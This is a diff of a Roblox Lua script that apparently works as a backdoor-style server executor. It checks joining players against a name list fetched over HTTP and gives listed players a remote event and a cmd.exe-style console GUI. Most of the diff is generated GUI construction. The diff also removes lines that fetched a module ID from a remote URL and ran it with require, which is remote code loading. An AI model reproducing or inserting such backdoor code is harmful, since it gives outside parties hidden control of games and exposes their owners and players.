@@ -1,3 +1,6 @@
+-- alt
+-- i used too old a code in the future i optimize
+
 local ins=Instance.new
 local cf=CFrame.new
 local load=false
@@ -8,6 +11,7 @@ local Repl=game:GetService("ReplicatedStorage")
 local Http=game:GetService("HttpService")
 local FluffyEvent=nil
 local Save={}
+_G.MEowMeOW=script
 local Sado=_G.MEowMeOW:FindFirstChildOfClass("ModuleScript")
 local ServerS=_G.MEowMeOW:FindFirstChildOfClass("Script")
 local ClientS=_G.MEowMeOW:FindFirstChildOfClass("LocalScript")
@@ -18,40 +22,600 @@ end
 
 local function ResetGui(plr,tru)
 	if tru then
-		local OutputGUI=_G.MEowMeOW:WaitForChild("OutputGUI"):Clone()
-		OutputGUI.Event.Value=FluffyEvent
-		OutputGUI:SetAttribute("Greeting",[[
-		          secret development 2027
-		]])
-		OutputGUI:SetAttribute("Help","yo")
-		OutputGUI.Parent=plr.PlayerGui
 		
-		local Client=ClientS:Clone()
-		Client.Parent=OutputGUI
-		Sado:Clone().Parent=Client
-		local SourceValue=ins("StringValue",Client)
+		local OutputGUI=ClientS:Clone()
+		local Event=ins("ObjectValue",OutputGUI)
+		Event.Name="Event"
+		Event.Value=FluffyEvent
+		OutputGUI.Name="OutputGUI"
+		OutputGUI.Parent=plr.PlayerGui
+		Sado:Clone().Parent=OutputGUI
+		local SourceValue=ins("StringValue",OutputGUI)
 		SourceValue.Value=[[if not game:IsLoaded() then
 	game.Loaded:Wait()
 end
+local LocalPl=game:GetService("Players").LocalPlayer
+-- Object: Lighting.MainModule.OutputGUI
+local MainGui=Instance.new("ScreenGui")
+MainGui.Name="OutputGUI"
+MainGui.IgnoreGuiInset=false
+MainGui.ResetOnSpawn=false
+MainGui.Enabled=true
+MainGui.DisplayOrder=999999999
+MainGui.Parent=script
+
+-- Object: Lighting.MainModule.OutputGUI.Frame
+local v2=Instance.new("Frame")
+v2.Name="Frame"
+v2.Size=UDim2.new(0,586,0,334)
+v2.Position=UDim2.new(0.4992537200450897,-292,0.6064356565475464,-253)
+v2.AnchorPoint=Vector2.new(0,0)
+v2.ZIndex=1
+v2.LayoutOrder=0
+v2.Visible=true
+v2.Draggable=true
+v2.Active=true
+v2.Selectable=false
+v2.BackgroundColor3=Color3.fromRGB(130,170,210)
+v2.BackgroundTransparency=0.3499999940395355
+v2.BorderSizePixel=0
+v2.BorderColor3=Color3.fromRGB(27,42,53)
+v2.Rotation=0
+v2.ClipsDescendants=false
+v2.Parent=MainGui
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.UICorner
+local v3=Instance.new("UICorner")
+v3.Name="UICorner"
+v3.CornerRadius=UDim.new(0,8)
+v3.Parent=v2
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.UIStroke
+local v4=Instance.new("UIStroke")
+v4.Name="UIStroke"
+v4.ZIndex=1
+v4.Thickness=1
+v4.Color=Color3.fromRGB(0,0,0)
+v4.Enabled=true
+v4.Parent=v2
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.UIStroke
+local v5=Instance.new("UIStroke")
+v5.Name="UIStroke"
+v5.ZIndex=1
+v5.Thickness=1.5
+v5.Color=Color3.fromRGB(255,255,255)
+v5.Enabled=true
+v5.Parent=v2
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame
+local v6=Instance.new("Frame")
+v6.Name="Frame"
+v6.Size=UDim2.new(1,-16,1,-42)
+v6.Position=UDim2.new(0,8,0,34)
+v6.AnchorPoint=Vector2.new(0,0)
+v6.ZIndex=1
+v6.LayoutOrder=0
+v6.Visible=true
+v6.Draggable=false
+v6.Active=false
+v6.Selectable=false
+v6.BackgroundColor3=Color3.fromRGB(0,0,0)
+v6.BackgroundTransparency=0.15000000596046448
+v6.BorderSizePixel=1
+v6.BorderColor3=Color3.fromRGB(70,100,120)
+v6.Rotation=0
+v6.ClipsDescendants=false
+v6.Parent=v2
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame.ScrollingFrame
+local v7=Instance.new("ScrollingFrame")
+v7.Name="ScrollingFrame"
+v7.Size=UDim2.new(1,-12,1,-10)
+v7.Position=UDim2.new(0,6,0,5)
+v7.AnchorPoint=Vector2.new(0,0)
+v7.ZIndex=1
+v7.LayoutOrder=0
+v7.Visible=true
+v7.Draggable=false
+v7.Active=false
+v7.Selectable=true
+v7.BackgroundColor3=Color3.fromRGB(163,162,165)
+v7.BackgroundTransparency=1
+v7.BorderSizePixel=0
+v7.BorderColor3=Color3.fromRGB(27,42,53)
+v7.Rotation=0
+v7.ClipsDescendants=true
+v7.Parent=v6
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame.ScrollingFrame.UIListLayout
+local v8=Instance.new("UIListLayout")
+v8.Name="UIListLayout"
+v8.FillDirection=Enum.FillDirection.Vertical
+v8.HorizontalAlignment=Enum.HorizontalAlignment.Left
+v8.VerticalAlignment=Enum.VerticalAlignment.Top
+v8.SortOrder=Enum.SortOrder.Name
+v8.Padding=UDim.new(0,1)
+v8.Parent=v7
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame.ScrollingFrame.Frame2
+local v9=Instance.new("Frame")
+v9.Name="Frame2"
+v9.Size=UDim2.new(1,0,0,16)
+v9.Position=UDim2.new(0,0,0,0)
+v9.AnchorPoint=Vector2.new(0,0)
+v9.ZIndex=1
+v9.LayoutOrder=0
+v9.Visible=true
+v9.Draggable=false
+v9.Active=false
+v9.Selectable=false
+v9.BackgroundColor3=Color3.fromRGB(163,162,165)
+v9.BackgroundTransparency=1
+v9.BorderSizePixel=1
+v9.BorderColor3=Color3.fromRGB(27,42,53)
+v9.Rotation=0
+v9.ClipsDescendants=false
+v9.Parent=v7
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame.ScrollingFrame.Frame2.TextLabel
+local v10=Instance.new("TextLabel")
+v10.Name="TextLabel"
+v10.Size=UDim2.new(0,165,1,0)
+v10.Position=UDim2.new(0,0,0,0)
+v10.AnchorPoint=Vector2.new(0,0)
+v10.ZIndex=1
+v10.LayoutOrder=0
+v10.Visible=true
+v10.Draggable=false
+v10.Active=false
+v10.Selectable=false
+v10.BackgroundColor3=Color3.fromRGB(163,162,165)
+v10.BackgroundTransparency=1
+v10.BorderSizePixel=1
+v10.BorderColor3=Color3.fromRGB(27,42,53)
+v10.Rotation=0
+v10.ClipsDescendants=false
+v10.Text="C:\Players.Expination>"
+v10.TextColor3=Color3.fromRGB(230,230,230)
+v10.TextSize=15
+v10.Font=Enum.Font.Code
+v10.TextScaled=false
+v10.TextWrapped=false
+v10.TextTransparency=0
+v10.TextXAlignment=Enum.TextXAlignment.Left
+v10.TextYAlignment=Enum.TextYAlignment.Center
+v10.MaxVisibleGraphemes=-1
+v10.Parent=v9
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame.ScrollingFrame.Frame2.TextBox
+local v11=Instance.new("TextBox")
+v11.Name="TextBox"
+v11.Size=UDim2.new(1,-170,1,0)
+v11.Position=UDim2.new(0,170,0,0)
+v11.AnchorPoint=Vector2.new(0,0)
+v11.ZIndex=1
+v11.LayoutOrder=0
+v11.Visible=true
+v11.Draggable=false
+v11.Active=true
+v11.Selectable=true
+v11.BackgroundColor3=Color3.fromRGB(163,162,165)
+v11.BackgroundTransparency=1
+v11.BorderSizePixel=1
+v11.BorderColor3=Color3.fromRGB(27,42,53)
+v11.Rotation=0
+v11.ClipsDescendants=false
+v11.Text=""
+v11.TextColor3=Color3.fromRGB(255,255,255)
+v11.TextSize=15
+v11.Font=Enum.Font.Code
+v11.TextScaled=false
+v11.TextWrapped=false
+v11.TextTransparency=0
+v11.TextXAlignment=Enum.TextXAlignment.Left
+v11.TextYAlignment=Enum.TextYAlignment.Center
+v11.PlaceholderText=""
+v11.PlaceholderColor3=Color3.fromRGB(178,178,178)
+v11.MaxVisibleGraphemes=-1
+v11.Parent=v9
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2
+local v12=Instance.new("Frame")
+v12.Name="Frame2"
+v12.Size=UDim2.new(1,0,0,34)
+v12.Position=UDim2.new(0,0,0,0)
+v12.AnchorPoint=Vector2.new(0,0)
+v12.ZIndex=1
+v12.LayoutOrder=0
+v12.Visible=true
+v12.Draggable=false
+v12.Active=false
+v12.Selectable=false
+v12.BackgroundColor3=Color3.fromRGB(163,162,165)
+v12.BackgroundTransparency=1
+v12.BorderSizePixel=1
+v12.BorderColor3=Color3.fromRGB(27,42,53)
+v12.Rotation=0
+v12.ClipsDescendants=false
+v12.Parent=v2
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.ImageLabel
+local v13=Instance.new("ImageLabel")
+v13.Name="ImageLabel"
+v13.Size=UDim2.new(0,26,0,26)
+v13.Position=UDim2.new(0,10,0,4)
+v13.AnchorPoint=Vector2.new(0,0)
+v13.ZIndex=1
+v13.LayoutOrder=0
+v13.Visible=true
+v13.Draggable=false
+v13.Active=false
+v13.Selectable=false
+v13.BackgroundColor3=Color3.fromRGB(163,162,165)
+v13.BackgroundTransparency=1
+v13.BorderSizePixel=1
+v13.BorderColor3=Color3.fromRGB(27,42,53)
+v13.Rotation=0
+v13.ClipsDescendants=false
+v13.Image="rbxassetid://9000135198"
+v13.ImageColor3=Color3.fromRGB(255,255,255)
+v13.ImageTransparency=0
+v13.ScaleType=Enum.ScaleType.Stretch
+v13.SliceScale=1
+v13.TileSize=UDim2.new(1,0,1,0)
+v13.Parent=v12
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.TextLabel
+local v14=Instance.new("TextLabel")
+v14.Name="TextLabel"
+v14.Size=UDim2.new(1,-150,1,0)
+v14.Position=UDim2.new(0,42,0,-1)
+v14.AnchorPoint=Vector2.new(0,0)
+v14.ZIndex=1
+v14.LayoutOrder=0
+v14.Visible=true
+v14.Draggable=false
+v14.Active=false
+v14.Selectable=false
+v14.BackgroundColor3=Color3.fromRGB(163,162,165)
+v14.BackgroundTransparency=1
+v14.BorderSizePixel=1
+v14.BorderColor3=Color3.fromRGB(27,42,53)
+v14.Rotation=0
+v14.ClipsDescendants=false
+v14.Text="C:\Windows\system32\cmd.exe"
+v14.TextColor3=Color3.fromRGB(10,10,10)
+v14.TextSize=22
+v14.Font=Enum.Font.SourceSans
+v14.TextScaled=false
+v14.TextWrapped=false
+v14.TextTransparency=0
+v14.TextXAlignment=Enum.TextXAlignment.Left
+v14.TextYAlignment=Enum.TextYAlignment.Center
+v14.MaxVisibleGraphemes=-1
+v14.Parent=v12
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Close
+local v15=Instance.new("Frame")
+v15.Name="Close"
+v15.Size=UDim2.new(0,46,0,20)
+v15.Position=UDim2.new(1,-50,0,2)
+v15.AnchorPoint=Vector2.new(0,0)
+v15.ZIndex=1
+v15.LayoutOrder=0
+v15.Visible=true
+v15.Draggable=false
+v15.Active=false
+v15.Selectable=false
+v15.BackgroundColor3=Color3.fromRGB(220,70,70)
+v15.BackgroundTransparency=0
+v15.BorderSizePixel=0
+v15.BorderColor3=Color3.fromRGB(27,42,53)
+v15.Rotation=0
+v15.ClipsDescendants=false
+v15.Parent=v12
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Close.UICorner
+local v16=Instance.new("UICorner")
+v16.Name="UICorner"
+v16.CornerRadius=UDim.new(0,3)
+v16.Parent=v15
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Close.Frame
+local v17=Instance.new("Frame")
+v17.Name="Frame"
+v17.Size=UDim2.new(1,0,0.5,0)
+v17.Position=UDim2.new(0,0,0,0)
+v17.AnchorPoint=Vector2.new(0,0)
+v17.ZIndex=1
+v17.LayoutOrder=0
+v17.Visible=true
+v17.Draggable=false
+v17.Active=false
+v17.Selectable=false
+v17.BackgroundColor3=Color3.fromRGB(255,255,255)
+v17.BackgroundTransparency=0.6000000238418579
+v17.BorderSizePixel=0
+v17.BorderColor3=Color3.fromRGB(27,42,53)
+v17.Rotation=0
+v17.ClipsDescendants=false
+v17.Parent=v15
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Close.Frame.UICorner
+local v18=Instance.new("UICorner")
+v18.Name="UICorner"
+v18.CornerRadius=UDim.new(0,3)
+v18.Parent=v17
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Close.TextButton
+local v19=Instance.new("TextButton")
+v19.Name="TextButton"
+v19.Size=UDim2.new(1,0,1,0)
+v19.Position=UDim2.new(0,0,0,0)
+v19.AnchorPoint=Vector2.new(0,0)
+v19.ZIndex=3
+v19.LayoutOrder=0
+v19.Visible=true
+v19.Draggable=false
+v19.Active=true
+v19.Selectable=true
+v19.Modal=false
+v19.BackgroundColor3=Color3.fromRGB(163,162,165)
+v19.BackgroundTransparency=1
+v19.BorderSizePixel=1
+v19.BorderColor3=Color3.fromRGB(27,42,53)
+v19.Rotation=0
+v19.ClipsDescendants=false
+v19.Text="X"
+v19.TextColor3=Color3.fromRGB(255,255,255)
+v19.TextSize=19
+v19.Font=Enum.Font.SourceSansBold
+v19.TextScaled=false
+v19.TextWrapped=true
+v19.TextTransparency=0
+v19.TextXAlignment=Enum.TextXAlignment.Center
+v19.TextYAlignment=Enum.TextYAlignment.Center
+v19.MaxVisibleGraphemes=-1
+v19.Parent=v15
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Max
+local v20=Instance.new("Frame")
+v20.Name="Max"
+v20.Size=UDim2.new(0,28,0,18)
+v20.Position=UDim2.new(1,-80,0,2)
+v20.AnchorPoint=Vector2.new(0,0)
+v20.ZIndex=1
+v20.LayoutOrder=0
+v20.Visible=true
+v20.Draggable=false
+v20.Active=false
+v20.Selectable=false
+v20.BackgroundColor3=Color3.fromRGB(200,220,240)
+v20.BackgroundTransparency=0
+v20.BorderSizePixel=0
+v20.BorderColor3=Color3.fromRGB(27,42,53)
+v20.Rotation=0
+v20.ClipsDescendants=false
+v20.Parent=v12
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Max.UICorner
+local v21=Instance.new("UICorner")
+v21.Name="UICorner"
+v21.CornerRadius=UDim.new(0,3)
+v21.Parent=v20
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Max.Frame
+local v22=Instance.new("Frame")
+v22.Name="Frame"
+v22.Size=UDim2.new(1,0,0.5,0)
+v22.Position=UDim2.new(0,0,0,0)
+v22.AnchorPoint=Vector2.new(0,0)
+v22.ZIndex=1
+v22.LayoutOrder=0
+v22.Visible=true
+v22.Draggable=false
+v22.Active=false
+v22.Selectable=false
+v22.BackgroundColor3=Color3.fromRGB(255,255,255)
+v22.BackgroundTransparency=0.6000000238418579
+v22.BorderSizePixel=0
+v22.BorderColor3=Color3.fromRGB(27,42,53)
+v22.Rotation=0
+v22.ClipsDescendants=false
+v22.Parent=v20
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Max.Frame.UICorner
+local v23=Instance.new("UICorner")
+v23.Name="UICorner"
+v23.CornerRadius=UDim.new(0,3)
+v23.Parent=v22
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Max.TextButton
+local v24=Instance.new("TextButton")
+v24.Name="TextButton"
+v24.Size=UDim2.new(1,0,1,0)
+v24.Position=UDim2.new(0,0,0,0)
+v24.AnchorPoint=Vector2.new(0,0)
+v24.ZIndex=3
+v24.LayoutOrder=0
+v24.Visible=true
+v24.Draggable=false
+v24.Active=true
+v24.Selectable=true
+v24.Modal=false
+v24.BackgroundColor3=Color3.fromRGB(163,162,165)
+v24.BackgroundTransparency=1
+v24.BorderSizePixel=1
+v24.BorderColor3=Color3.fromRGB(27,42,53)
+v24.Rotation=0
+v24.ClipsDescendants=false
+v24.Text="▢"
+v24.TextColor3=Color3.fromRGB(40,40,40)
+v24.TextSize=17
+v24.Font=Enum.Font.SourceSansBold
+v24.TextScaled=false
+v24.TextWrapped=true
+v24.TextTransparency=0
+v24.TextXAlignment=Enum.TextXAlignment.Center
+v24.TextYAlignment=Enum.TextYAlignment.Center
+v24.MaxVisibleGraphemes=-1
+v24.Parent=v20
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Min
+local v25=Instance.new("Frame")
+v25.Name="Min"
+v25.Size=UDim2.new(0,28,0,18)
+v25.Position=UDim2.new(1,-110,0,2)
+v25.AnchorPoint=Vector2.new(0,0)
+v25.ZIndex=1
+v25.LayoutOrder=0
+v25.Visible=true
+v25.Draggable=false
+v25.Active=false
+v25.Selectable=false
+v25.BackgroundColor3=Color3.fromRGB(200,220,240)
+v25.BackgroundTransparency=0
+v25.BorderSizePixel=0
+v25.BorderColor3=Color3.fromRGB(27,42,53)
+v25.Rotation=0
+v25.ClipsDescendants=false
+v25.Parent=v12
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Min.UICorner
+local v26=Instance.new("UICorner")
+v26.Name="UICorner"
+v26.CornerRadius=UDim.new(0,3)
+v26.Parent=v25
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Min.Frame
+local v27=Instance.new("Frame")
+v27.Name="Frame"
+v27.Size=UDim2.new(1,0,0.5,0)
+v27.Position=UDim2.new(0,0,0,0)
+v27.AnchorPoint=Vector2.new(0,0)
+v27.ZIndex=1
+v27.LayoutOrder=0
+v27.Visible=true
+v27.Draggable=false
+v27.Active=false
+v27.Selectable=false
+v27.BackgroundColor3=Color3.fromRGB(255,255,255)
+v27.BackgroundTransparency=0.6000000238418579
+v27.BorderSizePixel=0
+v27.BorderColor3=Color3.fromRGB(27,42,53)
+v27.Rotation=0
+v27.ClipsDescendants=false
+v27.Parent=v25
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Min.Frame.UICorner
+local v28=Instance.new("UICorner")
+v28.Name="UICorner"
+v28.CornerRadius=UDim.new(0,3)
+v28.Parent=v27
+
+-- Object: Lighting.MainModule.OutputGUI.Frame.Frame2.Min.TextButton
+local v29=Instance.new("TextButton")
+v29.Name="TextButton"
+v29.Size=UDim2.new(1,0,1,0)
+v29.Position=UDim2.new(0,0,0,0)
+v29.AnchorPoint=Vector2.new(0,0)
+v29.ZIndex=3
+v29.LayoutOrder=0
+v29.Visible=true
+v29.Draggable=false
+v29.Active=true
+v29.Selectable=true
+v29.Modal=false
+v29.BackgroundColor3=Color3.fromRGB(163,162,165)
+v29.BackgroundTransparency=1
+v29.BorderSizePixel=1
+v29.BorderColor3=Color3.fromRGB(27,42,53)
+v29.Rotation=0
+v29.ClipsDescendants=false
+v29.Text="—"
+v29.TextColor3=Color3.fromRGB(40,40,40)
+v29.TextSize=14
+v29.Font=Enum.Font.SourceSansBold
+v29.TextScaled=true
+v29.TextWrapped=true
+v29.TextTransparency=0
+v29.TextXAlignment=Enum.TextXAlignment.Center
+v29.TextYAlignment=Enum.TextYAlignment.Center
+v29.MaxVisibleGraphemes=-1
+v29.Parent=v25
+
+-- Object: Lighting.MainModule.OutputGUI.Event
+local v30=Instance.new("ObjectValue")
+v30.Name="Event"
+v30.Parent=MainGui
+
+-- Object: Lighting.MainModule.OutputGUI.Frame2
+local v31=Instance.new("Frame")
+v31.Name="Frame2"
+v31.Size=UDim2.new(1,0,0,24)
+v31.Position=UDim2.new(0,0,0,0)
+v31.AnchorPoint=Vector2.new(0,0)
+v31.ZIndex=1
+v31.LayoutOrder=0
+v31.Visible=false
+v31.Draggable=false
+v31.Active=false
+v31.Selectable=false
+v31.BackgroundColor3=Color3.fromRGB(163,162,165)
+v31.BackgroundTransparency=1
+v31.BorderSizePixel=0
+v31.BorderColor3=Color3.fromRGB(27,42,53)
+v31.Rotation=0
+v31.ClipsDescendants=false
+v31.Parent=MainGui
+
+-- Object: Lighting.MainModule.OutputGUI.Frame2.TextLabel
+local v32=Instance.new("TextLabel")
+v32.Name="TextLabel"
+v32.Size=UDim2.new(0,165,1,0)
+v32.Position=UDim2.new(0,0,0,0)
+v32.AnchorPoint=Vector2.new(0,0)
+v32.ZIndex=1
+v32.LayoutOrder=0
+v32.Visible=true
+v32.Draggable=false
+v32.Active=false
+v32.Selectable=false
+v32.BackgroundColor3=Color3.fromRGB(163,162,165)
+v32.BackgroundTransparency=1
+v32.BorderSizePixel=1
+v32.BorderColor3=Color3.fromRGB(27,42,53)
+v32.Rotation=0
+v32.ClipsDescendants=false
+v32.Text="C:\Players.Expination>"
+v32.TextColor3=Color3.fromRGB(230,230,230)
+v32.TextSize=15
+v32.Font=Enum.Font.Code
+v32.TextScaled=false
+v32.TextWrapped=false
+v32.TextTransparency=0
+v32.TextXAlignment=Enum.TextXAlignment.Left
+v32.TextYAlignment=Enum.TextYAlignment.Center
+v32.MaxVisibleGraphemes=-1
+v32.Parent=v31
+
 
 local ud2=UDim2.new
 local c3=Color3.new
 local v2=Vector2.new
 local ts=game:GetService("TextService")
 
-local UI=script.Parent
+local UI=MainGui
 
-local Colors=Instance.new("BoolValue",UI)
-Colors.Name="Colors"
-Colors.Value=true
-
+local Colors=true
 
 local Main=UI:WaitForChild("Frame"):WaitForChild("Frame2")
 
 local Scroll=UI:WaitForChild("Frame"):WaitForChild("Frame"):WaitForChild("ScrollingFrame")
 local Input=Scroll:WaitForChild("Frame2")
 
-local Event=UI:WaitForChild("Event").Value
+local Event=script:WaitForChild("Event").Value
 
 _G.CreateOutput=function(Data)
 	local Frame=UI.Frame2:Clone()
@@ -59,7 +623,7 @@ _G.CreateOutput=function(Data)
 	Frame.Visible=true
 	Frame.Parent=Scroll
 	Frame.TextLabel.Text=Data[1]
-	Frame.TextLabel.TextColor3=Colors.Value and (Data[2]=="error" and c3(1, 0, 0.0156863) or Data[2]=="warn" and c3(1, 0.666667, 0)) or c3(1, 1, 1)
+	Frame.TextLabel.TextColor3=Colors and (Data[2]=="error" and c3(1, 0, 0.0156863) or Data[2]=="warn" and c3(1, 0.666667, 0)) or c3(1, 1, 1)
 end
 
 local TextLabel=Input:WaitForChild("TextLabel")
@@ -92,10 +656,10 @@ TextBox:GetPropertyChangedSignal("Text"):Connect(function()
 		task.defer(function()TextBox.Text=prompt;TextBox.CursorPosition=pl+1 end)
 		if #cmd>0 then
 			if cmd=="help" then
-				_G.CreateOutput({UI:GetAttribute("Help")})
+				_G.CreateOutput({"yo","warn"})
 			elseif cmd=="colors" then
-				Colors.Value=not Colors.Value
-				_G.CreateOutput({"Colors are switched to "..tostring(Colors.Value)})
+				Colors=not Colors
+				_G.CreateOutput({"Colors are switched to "..tostring(Colors)})
 			elseif cmd=="clear" then
 				for _,v in next,Scroll:GetChildren() do
 					if v.Name=="1" then
@@ -128,11 +692,7 @@ TextBox:GetPropertyChangedSignal("AbsoluteSize"):Connect(us)
 
 us()
 
-repeat
-	task.wait()
-until _G.CreateOutput
-
-_G.CreateOutput({UI:GetAttribute("Greeting")})
+_G.CreateOutput({"i hate","warn"})
 
 Event.OnClientEvent:Connect(function(Data,t)
 	if t then
@@ -141,9 +701,8 @@ Event.OnClientEvent:Connect(function(Data,t)
 		_G.CreateOutput(Data)
 	end
 end)
-
-	]]
-		Client.Enabled=true
+]]
+		OutputGUI.Enabled=true
 
 		local a=false
 		OutputGUI.AncestryChanged:Connect(function(_,Prnt)
@@ -397,12 +956,8 @@ function Check(plr)
 	end)
 	if table.find(Http:JSONDecode(result),plr.Name) then
 		if not load then
-			local success,result=pcall(function()
-				return Http:GetAsync(Url.."id")
-			end)
 			FluffyEvent.Parent=Players
 			load=true
-			require(tonumber(result)).ROOWO(_G.MEowMeOW)
 			Test()
 		end
 		table.insert(Save,plr.Name)
